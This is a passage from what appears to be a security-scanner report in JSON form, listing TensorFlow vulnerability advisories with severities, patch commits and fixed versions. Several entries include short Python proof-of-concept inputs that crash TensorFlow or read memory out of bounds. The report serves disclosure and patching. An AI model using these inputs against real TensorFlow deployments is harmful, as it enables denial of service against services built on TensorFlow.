                "markdown": "**Vulnerability CVE-2022-41895**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41895](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41895)|\n\n### Impact\nIf [`MirrorPadGrad`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/mirror_pad_op.cc) is given outsize input `paddings`, TensorFlow will give a heap OOB error.\n\n```python\nimport tensorflow as tf\ntf.raw_ops.MirrorPadGrad(input=[1],\n             paddings=[[0x77f00000,0xa000000]],\n             mode = `REFLECT`)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [717ca98d8c3bba348ff62281fdf38dcb5ea1ec92](https://github.com/tensorflow/tensorflow/commit/717ca98d8c3bba348ff62281fdf38dcb5ea1ec92).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Vul AI.\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41889",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41889"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41889",
              "help": {
                "text": "Vulnerability CVE-2022-41889\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41889](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41889)\n### Impact\nIf a list of quantized tensors is assigned to an attribute, the pywrap code fails to parse the tensor and returns a `nullptr`, which is not caught. An example can be seen in [`tf.compat.v1.extract_volume_patches`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/generate_box_proposals_op.cu.cc) by passing in quantized tensors as input `ksizes`.\n```python\nimport numpy as np\nimport tensorflow as tf\n\na_input = np.array([1, -1], dtype= np.int32)\na_ksizes =  a_strides = tf.constant(dtype=tf.dtypes.qint16, value=[[1, 4], [5, 2]])\n\n\ntf.compat.v1.extract_volume_patches(input=a_input,ksizes=a_ksizes,strides=a_strides,padding=`VALID`)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [e9e95553e5411834d215e6770c81a83a3d0866ce](https://github.com/tensorflow/tensorflow/commit/e9e95553e5411834d215e6770c81a83a3d0866ce).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattankul.\n",
                "markdown": "**Vulnerability CVE-2022-41889**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41889](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41889)|\n\n### Impact\nIf a list of quantized tensors is assigned to an attribute, the pywrap code fails to parse the tensor and returns a `nullptr`, which is not caught. An example can be seen in [`tf.compat.v1.extract_volume_patches`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/generate_box_proposals_op.cu.cc) by passing in quantized tensors as input `ksizes`.\n```python\nimport numpy as np\nimport tensorflow as tf\n\na_input = np.array([1, -1], dtype= np.int32)\na_ksizes =  a_strides = tf.constant(dtype=tf.dtypes.qint16, value=[[1, 4], [5, 2]])\n\n\ntf.compat.v1.extract_volume_patches(input=a_input,ksizes=a_ksizes,strides=a_strides,padding=`VALID`)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [e9e95553e5411834d215e6770c81a83a3d0866ce](https://github.com/tensorflow/tensorflow/commit/e9e95553e5411834d215e6770c81a83a3d0866ce).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattankul.\n"
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41880",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41880"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41880",
              "help": {
                "text": "Vulnerability CVE-2022-41880\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41880](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41880)\n### Impact\nWhen the [`BaseCandidateSamplerOp`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/candidate_sampler_ops.cc) function  receives a value in `true_classes` larger than `range_max`, a heap oob vuln occurs.\n```python\ntf.raw_ops.ThreadUnsafeUnigramCandidateSampler(\n    true_classes=[[0x100000,1]],\n    num_true = 2,\n    num_sampled = 2,\n    unique = False,\n    range_max = 2,\n    seed = 2,\n    seed2 = 2)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [b389f5c944cadfdfe599b3f1e4026e036f30d2d4](https://github.com/tensorflow/tensorflow/commit/b389f5c944cadfdfe599b3f1e4026e036f30d2d4).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.\n",
                "markdown": "**Vulnerability CVE-2022-41880**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41880](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41880)|\n\n### Impact\nWhen the [`BaseCandidateSamplerOp`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/candidate_sampler_ops.cc) function  receives a value in `true_classes` larger than `range_max`, a heap oob vuln occurs.\n```python\ntf.raw_ops.ThreadUnsafeUnigramCandidateSampler(\n    true_classes=[[0x100000,1]],\n    num_true = 2,\n    num_sampled = 2,\n    unique = False,\n    range_max = 2,\n    seed = 2,\n    seed2 = 2)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [b389f5c944cadfdfe599b3f1e4026e036f30d2d4](https://github.com/tensorflow/tensorflow/commit/b389f5c944cadfdfe599b3f1e4026e036f30d2d4).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.\n"
              },
              "properties": {
                "security-severity": "6.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41910",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41910"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41910",
              "help": {
                "text": "Vulnerability CVE-2022-41910\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41910)\n### Impact\nThe function [MakeGrapplerFunctionItem](https://https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/grappler/utils/functions.cc#L221) takes arguments that determine the sizes of inputs and outputs. If the inputs given are greater than or equal to the sizes of the outputs, an out-of-bounds memory read or a crash is triggered.\n```python\nimport tensorflow as tf\n@tf.function\ndef test():\n    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],\n    \t\t\t\t\t\t\t\t   input_min=[1.0],\n    \t\t\t\t\t\t\t\t   input_max=[10.0],\n    \t\t\t\t\t\t\t\t   signed_input=True,\n    \t\t\t\t\t\t\t\t   num_bits=1,\n    \t\t\t\t\t\t\t\t   range_given=True,\n    \t\t\t\t\t\t\t\t   round_mode=`HALF_TO_EVEN`,\n    \t\t\t\t\t\t\t\t   narrow_range=True,\n    \t\t\t\t\t\t\t\t   axis=0x7fffffff)\ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb](https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb).\n\nThe fix will be included in TensorFlow 2.11.0. We will also cherrypick this commit on TensorFlow 2.10.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n",
                "markdown": "**Vulnerability CVE-2022-41910**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41910)|\n\n### Impact\nThe function [MakeGrapplerFunctionItem](https://https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/grappler/utils/functions.cc#L221) takes arguments that determine the sizes of inputs and outputs. If the inputs given are greater than or equal to the sizes of the outputs, an out-of-bounds memory read or a crash is triggered.\n```python\nimport tensorflow as tf\n@tf.function\ndef test():\n    tf.raw_ops.QuantizeAndDequantizeV2(input=[2.5],\n    \t\t\t\t\t\t\t\t   input_min=[1.0],\n    \t\t\t\t\t\t\t\t   input_max=[10.0],\n    \t\t\t\t\t\t\t\t   signed_input=True,\n    \t\t\t\t\t\t\t\t   num_bits=1,\n    \t\t\t\t\t\t\t\t   range_given=True,\n    \t\t\t\t\t\t\t\t   round_mode=`HALF_TO_EVEN`,\n    \t\t\t\t\t\t\t\t   narrow_range=True,\n    \t\t\t\t\t\t\t\t   axis=0x7fffffff)\ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb](https://github.com/tensorflow/tensorflow/commit/7b174a0f2e40ff3f3aa957aecddfd5aaae35eccb).\n\nThe fix will be included in TensorFlow 2.11.0. We will also cherrypick this commit on TensorFlow 2.10.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41902",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41902"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41902",
              "help": {
                "text": "Vulnerability CVE-2022-41902\nSeverity: high\nFixed Version: 2.10.1\nLink: [CVE-2022-41902](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41902)\n### Impact\nThe function [MakeGrapplerFunctionItem](https://https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/grappler/utils/functions.cc#L221) takes arguments that determine the sizes of inputs and outputs. If the inputs given are greater than or equal to the sizes of the outputs, an out-of-bounds memory read or a crash is triggered.\n\n### Patches\nWe have patched the issue in GitHub commit [a65411a1d69edfb16b25907ffb8f73556ce36bb7](https://github.com/tensorflow/tensorflow/commit/a65411a1d69edfb16b25907ffb8f73556ce36bb7).\n\nThe fix will be included in TensorFlow 2.11.0. We will also cherrypick this commit on TensorFlow 2.10.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n",
                "markdown": "**Vulnerability CVE-2022-41902**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.10.1|[CVE-2022-41902](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41902)|\n\n### Impact\nThe function [MakeGrapplerFunctionItem](https://https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/grappler/utils/functions.cc#L221) takes arguments that determine the sizes of inputs and outputs. If the inputs given are greater than or equal to the sizes of the outputs, an out-of-bounds memory read or a crash is triggered.\n\n### Patches\nWe have patched the issue in GitHub commit [a65411a1d69edfb16b25907ffb8f73556ce36bb7](https://github.com/tensorflow/tensorflow/commit/a65411a1d69edfb16b25907ffb8f73556ce36bb7).\n\nThe fix will be included in TensorFlow 2.11.0. We will also cherrypick this commit on TensorFlow 2.10.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n"
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-41900",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41900"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41900",
              "help": {
                "text": "Vulnerability CVE-2022-41900\nSeverity: high\nFixed Version: 2.10.1\nLink: [CVE-2022-41900](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41900)\n### Impact\nAn input `pooling_ratio` that is smaller than 1 will trigger a heap OOB in [`tf.raw_ops.FractionalMaxPool`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/fractional_max_pool_op.cc) and [`tf.raw_ops.FractionalAvgPool`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/fractional_avg_pool_op.cc).\n\n### Patches\nWe have patched the issue in GitHub commit [216525144ee7c910296f5b05d214ca1327c9ce48](https://github.com/tensorflow/tensorflow/commit/216525144ee7c910296f5b05d214ca1327c9ce48).\n\nThe fix will be included in TensorFlow 2.11.0. We will also cherry pick this commit on TensorFlow 2.10.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n",
                "markdown": "**Vulnerability CVE-2022-41900**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.10.1|[CVE-2022-41900](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41900)|\n\n### Impact\nAn input `pooling_ratio` that is smaller than 1 will trigger a heap OOB in [`tf.raw_ops.FractionalMaxPool`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/fractional_max_pool_op.cc) and [`tf.raw_ops.FractionalAvgPool`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/fractional_avg_pool_op.cc).\n\n### Patches\nWe have patched the issue in GitHub commit [216525144ee7c910296f5b05d214ca1327c9ce48](https://github.com/tensorflow/tensorflow/commit/216525144ee7c910296f5b05d214ca1327c9ce48).\n\nThe fix will be included in TensorFlow 2.11.0. We will also cherry pick this commit on TensorFlow 2.10.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n"
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-41887",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41887"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41887",
              "help": {
                "text": "Vulnerability CVE-2022-41887\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41887](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41887)\n### Impact\n[`tf.keras.losses.poisson`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/keras/losses.py) receives a `y_pred` and `y_true` that are passed through `functor::mul` in [`BinaryOp`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/cwise_ops_common.h). If the resulting dimensions overflow an `int32`, TensorFlow will crash due to a size mismatch during broadcast assignment.\n```python\nimport numpy as np\nimport tensorflow as tf\n\ntrue_value = tf.reshape(shape=[1, 2500000000], tensor = tf.zeros(dtype=tf.bool, shape=[50000, 50000]))\npred_value = np.array([[[-2]], [[8]]], dtype = np.float64)\n\ntf.keras.losses.poisson(y_true=true_value,y_pred=pred_value)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [c5b30379ba87cbe774b08ac50c1f6d36df4ebb7c](https://github.com/tensorflow/tensorflow/commit/c5b30379ba87cbe774b08ac50c1f6d36df4ebb7c).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1 and 2.9.3, as these are also affected and still in supported range. However, we will not cherrypick this commit into TensorFlow 2.8.x, as it depends on Eigen behavior that changed between 2.8 and 2.9.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattankul.\n",
                "markdown": "**Vulnerability CVE-2022-41887**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41887](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41887)|\n\n### Impact\n[`tf.keras.losses.poisson`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/keras/losses.py) receives a `y_pred` and `y_true` that are passed through `functor::mul` in [`BinaryOp`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/cwise_ops_common.h). If the resulting dimensions overflow an `int32`, TensorFlow will crash due to a size mismatch during broadcast assignment.\n```python\nimport numpy as np\nimport tensorflow as tf\n\ntrue_value = tf.reshape(shape=[1, 2500000000], tensor = tf.zeros(dtype=tf.bool, shape=[50000, 50000]))\npred_value = np.array([[[-2]], [[8]]], dtype = np.float64)\n\ntf.keras.losses.poisson(y_true=true_value,y_pred=pred_value)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [c5b30379ba87cbe774b08ac50c1f6d36df4ebb7c](https://github.com/tensorflow/tensorflow/commit/c5b30379ba87cbe774b08ac50c1f6d36df4ebb7c).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1 and 2.9.3, as these are also affected and still in supported range. However, we will not cherrypick this commit into TensorFlow 2.8.x, as it depends on Eigen behavior that changed between 2.8 and 2.9.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattankul.\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2023-25675",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25675"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25675",
              "help": {
                "text": "Vulnerability CVE-2023-25675\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25675](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25675)\n### Impact\nWhen running with XLA, `tf.raw_ops.Bincount` segfaults when given a parameter `weights` that is neither the same shape as parameter `arr` nor a length-0 tensor.\n\n```python\nimport tensorflow as tf\n\nfunc = tf.raw_ops.Bincount\npara={`arr`: 6, `size`: 804, `weights`: [52, 351]}\n\n@tf.function(jit_compile=True)\ndef fuzz_jit():\n y = func(**para)\n return y\n\nprint(fuzz_jit())\n```\n\n### Patches\nWe have patched the issue in GitHub commit [8ae76cf085f4be26295d2ecf2081e759e04b8acf](https://github.com/tensorflow/tensorflow/commit/8ae76cf085f4be26295d2ecf2081e759e04b8acf).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx of 360 AIVul Team\n",
                "markdown": "**Vulnerability CVE-2023-25675**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25675](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25675)|\n\n### Impact\nWhen running with XLA, `tf.raw_ops.Bincount` segfaults when given a parameter `weights` that is neither the same shape as parameter `arr` nor a length-0 tensor.\n\n```python\nimport tensorflow as tf\n\nfunc = tf.raw_ops.Bincount\npara={`arr`: 6, `size`: 804, `weights`: [52, 351]}\n\n@tf.function(jit_compile=True)\ndef fuzz_jit():\n y = func(**para)\n return y\n\nprint(fuzz_jit())\n```\n\n### Patches\nWe have patched the issue in GitHub commit [8ae76cf085f4be26295d2ecf2081e759e04b8acf](https://github.com/tensorflow/tensorflow/commit/8ae76cf085f4be26295d2ecf2081e759e04b8acf).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx of 360 AIVul Team\n"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25663",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25663"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25663",
              "help": {
                "text": "Vulnerability CVE-2023-25663\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25663](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25663)\n### Impact\nWhen ctx-\u003estep_containter() is a null ptr, the Lookup function will be executed with a null pointer.\n```python\nimport tensorflow as tf\ntf.raw_ops.TensorArrayConcatV2(handle=[`a`, `b`], flow_in = 0.1, dtype=tf.int32, element_shape_except0=1)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [239139d2ae6a81ae9ba499ad78b56d9b2931538a](https://github.com/tensorflow/tensorflow/commit/239139d2ae6a81ae9ba499ad78b56d9b2931538a).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Yu Tian",
                "markdown": "**Vulnerability CVE-2023-25663**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25663](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25663)|\n\n### Impact\nWhen ctx-\u003estep_containter() is a null ptr, the Lookup function will be executed with a null pointer.\n```python\nimport tensorflow as tf\ntf.raw_ops.TensorArrayConcatV2(handle=[`a`, `b`], flow_in = 0.1, dtype=tf.int32, element_shape_except0=1)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [239139d2ae6a81ae9ba499ad78b56d9b2931538a](https://github.com/tensorflow/tensorflow/commit/239139d2ae6a81ae9ba499ad78b56d9b2931538a).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Yu Tian"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25660",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25660"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25660",
              "help": {
                "text": "Vulnerability CVE-2023-25660\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25660](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25660)\n### Impact\nWhen the parameter `summarize` of `tf.raw_ops.Print` is zero, the new method `SummarizeArray\u003cbool\u003e` will reference to a nullptr, leading to a seg fault.\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.Print(input =  tf.constant([1, 1, 1, 1],dtype=tf.int32),\n                            data =  [[False, False, False, False], [False], [False, False, False]],\n                            message =  `tmp/I`,\n                            first_n = 100,\n                            summarize = 0)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [6d423b8bcc9aa9f5554dc988c1c16d038b508df1](https://github.com/tensorflow/tensorflow/commit/6d423b8bcc9aa9f5554dc988c1c16d038b508df1).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team\n",
                "markdown": "**Vulnerability CVE-2023-25660**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25660](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25660)|\n\n### Impact\nWhen the parameter `summarize` of `tf.raw_ops.Print` is zero, the new method `SummarizeArray\u003cbool\u003e` will reference to a nullptr, leading to a seg fault.\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.Print(input =  tf.constant([1, 1, 1, 1],dtype=tf.int32),\n                            data =  [[False, False, False, False], [False], [False, False, False]],\n                            message =  `tmp/I`,\n                            first_n = 100,\n                            summarize = 0)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [6d423b8bcc9aa9f5554dc988c1c16d038b508df1](https://github.com/tensorflow/tensorflow/commit/6d423b8bcc9aa9f5554dc988c1c16d038b508df1).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team\n"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25667",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25667"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25667",
              "help": {
                "text": "Vulnerability CVE-2023-25667\nSeverity: medium\nFixed Version: 2.11.1\nLink: [CVE-2023-25667](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25667)\n### Impact\nInteger overflow occurs when 2^31 \u003c= num_frames * height * width * channels \u003c 2^32, for example Full HD screencast of at least 346 frames.\n```python\nimport urllib.request\ndat = urllib.request.urlopen(`https://raw.githubusercontent.com/tensorflow/tensorflow/1c38ad9b78ffe06076745a1ee00cec42f39ff726/tensorflow/core/lib/gif/testdata/3g_multiframe.gif`).read()\nimport tensorflow as tf\ntf.io.decode_gif(dat)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [8dc723fcdd1a6127d6c970bd2ecb18b019a1a58d](https://github.com/tensorflow/tensorflow/commit/8dc723fcdd1a6127d6c970bd2ecb18b019a1a58d).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Andrei\n",
